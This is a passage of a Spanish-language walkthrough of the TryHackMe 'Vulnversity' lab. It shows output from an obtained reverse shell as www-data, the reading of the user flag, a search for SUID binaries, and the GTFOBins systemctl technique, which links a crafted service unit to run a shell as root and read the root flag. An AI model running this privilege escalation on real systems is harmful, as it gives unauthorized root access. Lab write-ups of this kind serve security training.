1234 ...<br>connect to [&lt;L_HOST&gt;] from (UNKNOWN) [&lt;R_HOST&gt;] 49782<br>Linux vulnuniversity 4.4.0-142-generic <span class="hljs-comment">#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br> 11:41:08 up 14 min,  0 users,  load average: 0.00, 0.13, 0.26<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>sh: 0: can<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ </span><br></code></pre></td></tr></table></figure><p>Para saber que usuario gestiona el servidor web, deberemos ver que usuarios hay en la ruta <strong>/home</strong> y comprobar a cuales tenemos acceso.</p><p>Input:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> /home      <br>$ ls<br>bill<br>$ <span class="hljs-built_in">cd</span> bill<br>$ ls<br>user.txt<br>$ cat user.txt<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">8bd799<span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">***</span> USER FLAG<br></code></pre></td></tr></table></figure><h3 id="3-Solucion-1"><a href="#3-Solucion-1" class="headerlink" title="3. Solución"></a>3. Solución</h3><p><img src="/img/Walkthrough/THM/Vulnversity/task_4_1.png" alt="Figura 8: Solución Task 4"><br><img src="/img/Walkthrough/THM/Vulnversity/task_4_2.png" alt="Figura 9: Solución Task 4"></p><h2 id="Task-5-Escalada-de-privilegios"><a href="#Task-5-Escalada-de-privilegios" class="headerlink" title="Task 5 - Escalada de privilegios"></a>Task 5 - Escalada de privilegios</h2><p>En esta máquina deberemos explotar una vulnerabilidad típica llamada <strong>SUID Vulnerability</strong>. Se trata de aprovecharse de esos ejecutables o ficheros que tienen el bit de SUID habilitado para poder ejecutar servicios con los privilegios de otro usuario.</p><h4 id="1-Encontrar-programas-con-bit-SUID-habilitado"><a href="#1-Encontrar-programas-con-bit-SUID-habilitado" class="headerlink" title="1. Encontrar programas con bit SUID habilitado"></a>1. Encontrar programas con bit SUID habilitado</h4><p>Para comprobar que ejecutables tienen el bit de SUID habilitado, ejecutaremos el siguiente comando:</p><p>Input:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user root -perm 4000 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/bin/newuidmap<br>/usr/bin/chfn<br>/usr/bin/newgidmap<br>/usr/bin/sudo<br>/usr/bin/chsh<br>/usr/bin/passwd<br>/usr/bin/pkexec<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/lib/snapd/snap-confine<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/squid/pinger<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br>/bin/su<br>/bin/ntfs-3g<br>/bin/mount<br>/bin/ping6<br>/bin/umount<br>/bin/systemctl<br>/bin/ping<br>/bin/fusermount<br>/sbin/mount.cifs<br></code></pre></td></tr></table></figure><p>Si buscamos por internet técnicas de escalado de privilegios sobre los diferentes binarios que nos aparecen en la lista, veremos que el <strong>/bin/systemctl</strong> es un binario muy utilizado para este tipo de tareas. Una web muy recomendada para consultar diferentes técnicas de escalado de privilegios es <a href="https://gtfobins.github.io/">https://gtfobins.github.io</a>.<br><img src="/img/Walkthrough/THM/Vulnversity/gtfobins.png" alt="Figura 10: Consulta de ../systemctl en gftobins"></p><h4 id="2-Escalar-privilegios"><a href="#2-Escalar-privilegios" class="headerlink" title="2. Escalar privilegios"></a>2. Escalar privilegios</h4><p>Para aprovecharnos de la escalada de privilegios mediante el <strong>SUID</strong> del <strong>/bin/systemctl</strong> deberemos ejecutar los siguientes comandos en la consola. la variable <strong>ExecStart</strong> es la que deberemos modificar para que en vez de obtener el id del usuario que ejecuta el programa, que nos lea el contenido del fichero <strong>/root/root.txt</strong> para obtener la flag.</p><p>Input:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">TF=$<span class="hljs-params">(mktemp)</span><span class="hljs-string">.service</span><br><span class="hljs-keyword">echo</span> &#x27;[Service]<br>Type=oneshot<br>ExecStart=<span class="hljs-string">/bin/sh</span> -c <span class="hljs-string">&quot;cat /root/root.txt &gt; /tmp/output&quot;</span><br>[Install]<br>WantedBy=multi-user.target&#x27; &gt; $TF<br><span class="hljs-string">/bin/systemctl</span> link $TF<br><span class="hljs-string">/bin/systemctl</span> enable <span class="hljs-params">--now</span> $TF<br>cat <span class="hljs-string">/tmp/output</span><br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">a58ff8<span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">***</span> ROOT FLAG<br></code></pre></td></tr></table></figure><h4 id="3-Solucion-2"><a href="#3-Solucion-2" class="headerlink" title="3. Solución"></a>3. Solución</h4><p><img src="/img/Walkthrough/THM/Vulnversity/task_5.png" alt="Figura X: Solución Task 5"></p>]]></content>
    
    
    <categories>
      
      <category>Walkthroughs</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Laboratorio</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
